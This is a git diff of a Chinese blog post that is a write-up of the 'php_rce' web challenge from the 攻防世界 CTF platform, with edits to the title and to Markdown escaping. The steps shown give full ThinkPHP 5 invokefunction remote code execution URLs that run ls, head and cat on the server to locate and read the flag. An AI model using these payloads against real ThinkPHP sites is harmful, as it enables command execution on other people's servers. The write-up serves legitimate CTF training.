@@ -1,7 +1,7 @@
 ---
 layout: post
-title: Web新手题-php_rce
-excerpt: "攻防世界新手Web题目-php_rce"
+title: Web进阶题-php_rce
+excerpt: "攻防世界进阶Web题目-php_rce"
 date:   2020-10-12 19:28:00
 categories: [CTF]
 comments: true
@@ -14,7 +14,7 @@ comments: true
 3. 遍历目录寻找flag，*ip:port//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=ls*，返回网页内容为"static"
 4. 进入static，查看文件夹内容，*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd%20static;ls*，返回网页内容为空
 5. 发现ls只会返回来一行，所以可以通过head命令，查看特定的某一行
-6. 最后*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd /;ls -l|head -n 6*，发现了flag文件，网页返回内容为“-rw-r--r-- 1 root root 20 Jul 29 2019 flag”
+6. 最后*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd /;ls -l\|head \-n 6*，发现了flag文件，网页返回内容为“-rw-r--r-- 1 root root 20 Jul 29 2019 flag”
 7. 访问该文件内容，*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd% /;cat flag;*，网页返回内容为"flag{thinkphp5_rce}"
 8. 提交flag，答案正确。
 
